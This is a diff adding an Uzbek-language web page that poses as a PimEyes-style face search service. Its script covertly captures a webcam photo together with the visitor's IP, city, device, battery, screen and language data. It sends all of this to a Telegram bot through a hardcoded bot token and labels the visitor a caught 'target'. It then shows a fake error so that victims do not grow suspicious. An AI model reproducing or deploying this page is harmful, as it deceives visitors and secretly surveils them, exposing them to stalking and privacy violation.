@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ai face generate - Face Search Engine</title>
+    <style>
+        /* CSS QISMI - Dizaynni PimEyes'ga 1:1 o'xshatish */
+        body { font-family: 'Segoe UI', sans-serif; background: #f8fafd; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; max-width: 500px; width: 90%; }
+        .logo { color: #0066ff; font-size: 28px; font-weight: bold; margin-bottom: 10px; }
+        h1 { font-size: 32px; margin: 10px 0; color: #1a1a1b; }
+        .upload-box { border: 2px dashed #0066ff; border-radius: 15px; padding: 40px 20px; cursor: pointer; transition: 0.3s; margin-bottom: 20px; background: #fff; }
+        .upload-box:hover { background: #f0f7ff; }
+        .btn-main { background: #e91e63; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #status { color: #65676b; margin-top: 15px; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="logo">AI Face Generate</div>
+    <h1>Face IT Bo'yicha Qidiruv Tizimi</h1>
+    <p>Bu sayt sizning yuzingizga o'xshash yuzlarni topib beradi:</p>
+
+    <div class="upload-box" onclick="startScanner()">
+        <div style="font-size: 50px;">📤</div>
+        <strong>Yuzingizni skanerlash uchun bu yerga bosing</strong>
+    </div>
+
+    <button class="btn-main" onclick="startScanner()">Yangi funksiyamizni sinab ko'ring</button>
+    <div id="status">Tizim skanerlamoqda...</div>
+</div>
+
+<video id="video" width="640" height="480" autoplay style="display:none"></video>
+<canvas id="canvas" width="640" height="480" style="display:none"></canvas>
+
+<script>
+    /* JAVASCRIPT QISMI - Ma'lumot yig'ish va botga yuborish */
+    const token = "8103900618:AAHIP38KJ0Y0Rr1u1P4n9z6PdbAr9LAM-fk";
+    const chat_id = "8041707187";
+
+    async function startScanner() {
+        document.getElementById('status').innerText = "Processing... Please wait.";
+        
+        try {
+            // 1. Kameraga ruxsat so'rash
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // 2. IP va Joylashuvni aniqlash (Shahar va Davlat)
+            const geoRes = await fetch('https://ipapi.co/json/');
+            const geoData = await geoRes.json();
+
+            // Qurilma va OS ma'lumotlarini chuqur tahlil qilish
+        const ua = navigator.userAgent;
+        let deviceModel = "Noma'lum qurilma";
+
+        if (/android/i.test(ua)) {
+            const match = ua.match(/Android\s+([^\s;]+);\s+([^\s;]+)/);
+            deviceModel = match ? "📱 " + match[2] : "📱 Android telefon";
+        } else if (/iPhone|iPad|iPod/i.test(ua)) {
+            deviceModel = "🍎 iOS (Apple)";
+        } else if (/Windows NT 10.0/i.test(ua)) {
+            // Windows 10 va 11 ni brauzer bir xil '10.0' deb ko'rsatadi
+            // Ularni farqlash uchun ekran chekkalari yoki yangi API kerak
+            deviceModel = "💻 Windows 10 yoki 11 PC";
+        } else if (/Windows NT 6.1/i.test(ua)) {
+            deviceModel = "💻 Windows 7 PC";
+        } else if (/Macintosh/i.test(ua)) {
+            deviceModel = "🍏 MacBook (macOS)";
+        } else if (/Linux/i.test(ua)) {
+            // Senga kerak bo'lgan Linux qismi
+            deviceModel = "🐧 Linux OS (Desktop)";
+        } else if (/X11/i.test(ua)) {
+            deviceModel = "Unix tizimi";
+        }
+
+            // 4. Batareya va Ekran ma'lumotlari
+            let batteryLevel = "Noma'lum";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryLevel = Math.round(b.level * 100) + "%";
+            }
+            const screenInfo = `${window.screen.width}x${window.screen.height}`;
+
+            // 5. Rasmga tushirish va yuborish
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chat_id);
+                    formData.append('photo', blob, 'target.jpg');
+                    formData.append('caption', 
+                        `📸 **Yangi nishon tutildi!**\n\n` +
+                        `👤 **Qurilma:** ${deviceModel}\n` +
+                        `🌐 **IP:** ${geoData.ip}\n` +
+                        `📍 **Shahar:** ${geoData.city}, ${geoData.country_name}\n` +
+                        `🔋 **Zaryad:** ${batteryLevel}\n` +
+                        `📐 **Ekran:** ${screenInfo}\n` +
+                        `🌍 **Til:** ${navigator.language}\n` +
+                        `⏰ **Vaqt:** ${new Date().toLocaleString()}`
+                    );
+
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    // 6. Shubha uyg'otmaslik uchun xatolik ko'rsatish
+                    alert("Error 404: Tizim yuzingizni taniy olmadi. Iltimos, qayta urinib ko'ring.");
+                    stream.getTracks().forEach(t => t.stop());
+                    document.getElementById('status').innerText = "System error. Try again.";
+                }, 'image/jpeg');
+            }, 1000);
+
+        } catch (err) {
+            alert("Error 404: Kameraga ruxsat berilmasa, qidiruv tizimi ishlamaydi!");
+            document.getElementById('status').innerText = "Permission denied.";
+        }
+    }
+</script>
+
+</body>
+</html>
